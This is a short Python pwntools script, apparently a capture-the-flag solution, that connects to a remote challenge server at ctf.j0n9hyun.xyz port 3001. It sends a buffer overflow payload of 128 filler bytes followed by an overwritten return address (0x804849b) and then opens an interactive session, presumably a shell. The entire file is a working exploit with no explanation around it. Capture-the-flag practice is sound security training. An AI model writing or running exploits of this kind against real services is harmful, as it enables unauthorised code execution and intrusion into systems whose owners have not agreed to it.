from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3001)

payload = b"A"*128+p32(0x804849b)
p.sendline(payload)
p.interactive()
